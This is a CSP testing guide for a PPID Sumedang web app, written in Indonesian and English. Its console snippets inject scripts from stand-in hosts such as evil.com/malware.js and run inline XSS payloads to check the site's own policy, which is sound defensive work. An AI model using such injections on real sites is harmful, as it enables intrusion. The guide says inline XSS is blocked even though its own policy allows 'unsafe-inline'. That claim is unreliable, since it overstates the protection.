# 🧪 CSP Testing Guide - PPID Sumedang
**Content Security Policy Testing & Verification**

Panduan lengkap untuk test dan verifikasi CSP di browser.

---

## 📋 Persiapan Testing

### 1. Browser yang Didukung
- ✅ **Chrome/Edge** (Recommended - best DevTools)
- ✅ **Firefox** (Good CSP reporting)
- ✅ **Safari** (Full support)
- ⚠️ **IE11** (Partial support - deprecated)

### 2. Tools yang Dibutuhkan
- Browser Developer Tools (F12)
- Internet connection (untuk test external resources)
- Text editor (untuk inject test scripts)

---

## 🔍 Test 1: Verifikasi CSP Header Ada

### Langkah-langkah:

**1. Buka halaman PPID:**
```
http://localhost:8080/ppid/
```

**2. Buka Developer Tools:**
- Tekan `F12` atau `Ctrl+Shift+I` (Windows/Linux)
- Tekan `Cmd+Option+I` (Mac)

**3. Buka tab Network:**
- Klik tab **Network**
- Refresh halaman (`F5` atau `Ctrl+R`)

**4. Klik request pertama:**
- Klik pada request pertama (biasanya nama file: `/ppid/` atau `index`)
- Pastikan Type: `document`

**5. Cek Response Headers:**
- Klik tab **Headers**
- Scroll ke bagian **Response Headers**
- Cari header `Content-Security-Policy`

**Expected Result:**
```
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.jsdelivr.net https://code.jquery.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; img-src 'self' data: https:; font-src 'self' data: https://fonts.gstatic.com; connect-src 'self'; frame-ancestors 'self'; base-uri 'self'; form-action 'self'
```

**✅ PASS:** Header CSP ditemukan
**❌ FAIL:** Header tidak ada → CSP tidak aktif

---

## 🛡️ Test 2: CSP Blocking External Script (Security Test)

Test apakah CSP memblock script dari domain yang tidak dipercaya.

### Langkah-langkah:

**1. Buka halaman PPID:**
```
http://localhost:8080/ppid/
```

**2. Buka Console:**
- Developer Tools (F12)
- Tab **Console**

**3. Inject malicious script:**
Paste code ini di console dan tekan Enter:
```javascript
// Test 1: Inject external script dari domain tidak dipercaya
var script = document.createElement('script');
script.src = 'https://evil-hacker-domain.com/malware.js';
document.body.appendChild(script);
```

**Expected Result - CSP BLOCKING:**
```
Refused to load the script 'https://evil-hacker-domain.com/malware.js'
because it violates the following Content Security Policy directive:
"script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.jsdelivr.net https://code.jquery.com".
Note that 'script-src-elem' was not explicitly set, so 'script-src' is used as a fallback.
```

**✅ PASS:** Script di-block oleh CSP → Security working!
**❌ FAIL:** Script loaded tanpa error → CSP tidak aktif atau terlalu loose

---

## 🔒 Test 3: CSP Allowing Trusted Domain

Test apakah CSP mengizinkan script dari domain yang dipercaya (CDN).

### Langkah-langkah:

**1. Buka Console (F12)**

**2. Inject script dari CDN yang dipercaya:**
```javascript
// Test 2: Script dari CDN yang whitelisted (harus berhasil)
var script = document.createElement('script');
script.src = 'https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js';
script.onload = function() {
    console.log('✅ jQuery loaded successfully from trusted CDN!');
};
script.onerror = function() {
    console.log('❌ Failed to load jQuery - CSP might be too strict');
};
document.head.appendChild(script);
```

**Expected Result - CSP ALLOWING:**
```
✅ jQuery loaded successfully from trusted CDN!
```

**✅ PASS:** Script dari CDN dipercaya berhasil load
**❌ FAIL:** Script di-block → CSP terlalu strict

---

## 🖼️ Test 4: CSP Image Loading

Test apakah CSP mengizinkan gambar dari berbagai sumber.

### Langkah-langkah:

**1. Buka Console**

**2. Test load image dari HTTPS:**
```javascript
// Test 3: Load image dari HTTPS (harus berhasil)
var img = document.createElement('img');
img.src = 'https://via.placeholder.com/150';
img.onload = function() {
    console.log('✅ HTTPS image loaded successfully!');
};
img.onerror = function() {
    console.log('❌ HTTPS image blocked by CSP');
};
document.body.appendChild(img);
```

**3. Test load image dari HTTP:**
```javascript
// Test 4: Load image dari HTTP (harus di-block jika strict)
var img2 = document.createElement('img');
img2.src = 'http://via.placeholder.com/150';
img2.onload = function() {
    console.log('⚠️ HTTP image loaded - CSP allows mixed content');
};
img2.onerror = function() {
    console.log('✅ HTTP image blocked - CSP enforcing HTTPS');
};
document.body.appendChild(img2);
```

**Expected Result:**
```
✅ HTTPS image loaded successfully!
✅ HTTP image blocked - CSP enforcing HTTPS
```
(atau mixed content warning dari browser)

---

## 🚫 Test 5: CSP Iframe Protection (Clickjacking)

Test apakah CSP melindungi dari clickjacking via iframe.

### Langkah-langkah:

**1. Buat file test HTML:**
Buat file `test-iframe.html` di desktop:
```html
<!DOCTYPE html>
<html>
<head>
    <title>CSP Iframe Test</title>
</head>
<body>
    <h1>Trying to embed PPID in iframe...</h1>
    <iframe src="http://localhost:8080/ppid/" width="800" height="600"></iframe>
    <p>If you see PPID content above, CSP frame-ancestors is NOT working.</p>
    <p>If you see error/blank, CSP is protecting against clickjacking ✅</p>
</body>
</html>
```

**2. Buka file di browser:**
- Double-click `test-iframe.html`

**Expected Result - CSP BLOCKING:**
```
Refused to display 'http://localhost:8080/ppid/' in a frame
because it set 'X-Frame-Options' to 'sameorigin'.
```
atau
```
Refused to frame 'http://localhost:8080/ppid/' because an ancestor violates
the following Content Security Policy directive: "frame-ancestors 'self'".
```

**✅ PASS:** Iframe kosong/error → Protected from clickjacking
**❌ FAIL:** PPID content terlihat di iframe → Not protected

---

## 📊 Test 6: CSP Violation Report

Lihat semua CSP violations yang terjadi di halaman.

### Langkah-langkah:

**1. Buka Developer Tools (F12)**

**2. Tab Console - Filter CSP:**
- Klik icon filter di console
- Enable "Violations" atau filter by "CSP"

**3. Refresh halaman:**
- Tekan `F5`
- Lihat semua CSP violations yang muncul

**4. Analyze violations:**

**Contoh violation yang mungkin muncul:**
```
[Violation] 'unsafe-inline' is not an effective policy.
```
→ ⚠️ Warning: unsafe-inline mengurangi efektivitas CSP

```
Refused to execute inline script because it violates CSP directive 'script-src...'
```
→ ❌ Ada inline script yang di-block (perlu diperbaiki)

**Expected Result:**
- ✅ **Minimal violations** - Hanya warning minor
- ❌ **Banyak violations** - Ada masalah CSP atau kode

---

## 🔧 Test 7: CSP with Online Tools

### Mozilla Observatory

**1. Buka:** https://observatory.mozilla.org/

**2. Masukkan domain:**
```
(Jika sudah production, masukkan domain production)
localhost tidak bisa di-scan
```

**3. Klik "Scan Me"**

**4. Lihat CSP Score:**
- Grade A+ = Excellent CSP
- Grade A = Good CSP
- Grade B = Moderate CSP
- Grade C/D/F = Weak CSP

### CSP Evaluator (Google)

**1. Buka:** https://csp-evaluator.withgoogle.com/

**2. Copy CSP policy dari Response Headers**

**3. Paste ke CSP Evaluator**

**4. Klik "Check CSP"**

**5. Review findings:**
- 🔴 **High severity** - Fix immediately
- 🟠 **Medium severity** - Fix when possible
- 🟡 **Low severity** - Nice to have
- 🟢 **Info** - Best practices

**Expected Issues untuk PPID:**
```
⚠️ 'unsafe-inline' allows the execution of unsafe in-page scripts and event handlers.
⚠️ 'unsafe-eval' allows the execution of code dynamically injected into the page.
```
→ Ini expected karena jQuery & Bootstrap memerlukan unsafe-inline dan unsafe-eval

---

## 📝 Test 8: Manual CSP Compliance Check

### Checklist CSP Compliance:

**✅ Basic Protection:**
- [ ] CSP header present in all pages
- [ ] `default-src 'self'` prevents untrusted resources
- [ ] `script-src` whitelist CDN yang dipercaya saja
- [ ] `frame-ancestors 'self'` mencegah clickjacking

**✅ Script Security:**
- [ ] External scripts hanya dari whitelisted domains
- [ ] Inline scripts minimal (gunakan external files)
- [ ] `eval()` usage minimal

**✅ Style Security:**
- [ ] External CSS hanya dari whitelisted domains
- [ ] Inline styles minimal

**✅ Image Security:**
- [ ] Images dari `self` dan HTTPS
- [ ] Data URIs allowed (`data:`)
- [ ] HTTP images blocked (mixed content)

**✅ Form Security:**
- [ ] `form-action 'self'` prevents form hijacking
- [ ] Forms hanya submit ke domain sendiri

**✅ Iframe Protection:**
- [ ] `frame-ancestors 'self'` active
- [ ] Website tidak bisa di-embed di domain lain

---

## 🎯 Test Results Interpretation

### Scoring Guide:

| Test Passed | Security Level | Action |
|-------------|----------------|--------|
| 8/8 | 🟢 **Excellent** | Production ready |
| 6-7/8 | 🟡 **Good** | Minor fixes needed |
| 4-5/8 | 🟠 **Moderate** | Review CSP policy |
| 0-3/8 | 🔴 **Poor** | Major fixes needed |

### Common Issues & Fixes:

**Issue 1: Too many CSP violations**
```
Fix: Review and whitelist legitimate resources
```

**Issue 2: Inline scripts blocked**
```
Fix: Move inline scripts to external .js files
or: Add nonce/hash (advanced)
```

**Issue 3: Trusted CDN blocked**
```
Fix: Add CDN to script-src whitelist
```

**Issue 4: Mixed content (HTTP/HTTPS)**
```
Fix: Change all HTTP resources to HTTPS
```

---

## 🔬 Advanced Testing: CSP Bypass Attempts

Test apakah CSP benar-benar aman dari bypass techniques.

### Test XSS with CSP:

**1. Test XSS dalam user input:**
```javascript
// Simulate XSS attack in console
document.body.innerHTML += '<img src=x onerror="alert(\'XSS\')">';
```

**Expected Result:**
```
[CSP] Refused to execute inline event handler because it violates CSP directive...
```
→ ✅ XSS blocked by CSP

**2. Test Script injection:**
```javascript
// Simulate script injection
document.write('<script>alert("XSS")</script>');
```

**Expected Result:**
```
[CSP] Refused to execute inline script...
```
→ ✅ Script injection blocked

---

## 📊 Current PPID CSP Status

### Active CSP Policy:
```
default-src 'self';
script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.jsdelivr.net https://code.jquery.com;
style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
img-src 'self' data: https:;
font-src 'self' data: https://fonts.gstatic.com;
connect-src 'self';
frame-ancestors 'self';
base-uri 'self';
form-action 'self';
```

### Security Level: **MODERATE** 🟡

**Strengths:**
- ✅ External resources whitelisted
- ✅ Frame protection active
- ✅ Form hijacking prevented
- ✅ Base URI locked

**Weaknesses:**
- ⚠️ `unsafe-inline` reduces XSS protection
- ⚠️ `unsafe-eval` allows code injection risks
- ℹ️ Necessary for jQuery/Bootstrap compatibility

### Recommendations:
1. **Keep current CSP** - Good balance for legacy code
2. **Monitor violations** - Check console regularly
3. **Gradual tightening** - Remove unsafe-* when migrating to modern JS
4. **Add CSP reporting** - Log violations to server (optional)

---

## 🚀 Quick Test Script

Copy-paste ini ke browser console untuk test semua sekaligus:

```javascript
console.log('🧪 CSP Testing Suite - PPID Sumedang\n');

// Test 1: Check CSP header
fetch(window.location.href)
    .then(response => {
        const csp = response.headers.get('Content-Security-Policy');
        if (csp) {
            console.log('✅ Test 1 PASS: CSP header found');
            console.log('   Policy:', csp.substring(0, 100) + '...');
        } else {
            console.log('❌ Test 1 FAIL: CSP header NOT found');
        }
    });

// Test 2: Block untrusted script
setTimeout(() => {
    console.log('\n🔒 Test 2: Blocking untrusted script...');
    var script = document.createElement('script');
    script.src = 'https://evil.com/malware.js';
    script.onerror = () => console.log('✅ Test 2 PASS: Evil script blocked!');
    document.body.appendChild(script);
}, 1000);

// Test 3: Allow trusted CDN
setTimeout(() => {
    console.log('\n🌐 Test 3: Loading trusted CDN...');
    var script = document.createElement('script');
    script.src = 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js';
    script.onload = () => console.log('✅ Test 3 PASS: Trusted CDN loaded!');
    script.onerror = () => console.log('❌ Test 3 FAIL: Trusted CDN blocked');
    document.head.appendChild(script);
}, 2000);

// Test 4: HTTPS image
setTimeout(() => {
    console.log('\n🖼️ Test 4: Loading HTTPS image...');
    var img = new Image();
    img.onload = () => console.log('✅ Test 4 PASS: HTTPS image loaded!');
    img.onerror = () => console.log('❌ Test 4 FAIL: HTTPS image blocked');
    img.src = 'https://via.placeholder.com/1';
}, 3000);

setTimeout(() => {
    console.log('\n📊 CSP Testing Complete!');
    console.log('Check results above ⬆️');
}, 4000);
```

**Usage:**
1. Buka http://localhost:8080/ppid/
2. Buka Console (F12)
3. Paste script di atas
4. Tekan Enter
5. Tunggu 5 detik
6. Lihat hasil test

**Expected Output:**
```
✅ Test 1 PASS: CSP header found
✅ Test 2 PASS: Evil script blocked!
✅ Test 3 PASS: Trusted CDN loaded!
✅ Test 4 PASS: HTTPS image loaded!
📊 CSP Testing Complete!
```

---

## 📞 Troubleshooting

### CSP tidak aktif (header tidak ada)
**Cause:** Hooks tidak enabled
**Fix:**
```php
// File: application/config/config.php
$config['enable_hooks'] = TRUE;  // Pastikan TRUE

// File: application/config/hooks.php
// Pastikan Security_headers hook ada dan aktif
```

### CSP terlalu strict (memblock resource yang sah)
**Cause:** Whitelist kurang lengkap
**Fix:** Tambahkan domain ke CSP policy di `Security_headers.php`

### CSP violations banyak tapi tidak ada error
**Cause:** Report-only mode
**Fix:** Pastikan header `Content-Security-Policy` bukan `Content-Security-Policy-Report-Only`

---

**Testing Guide Created:** 2025-11-22
**For:** PPID Kabupaten Sumedang
**CSP Version:** Moderate Security Level
